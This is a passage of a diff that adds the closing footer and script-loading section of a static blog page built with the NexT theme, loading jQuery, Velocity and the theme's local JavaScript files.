+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
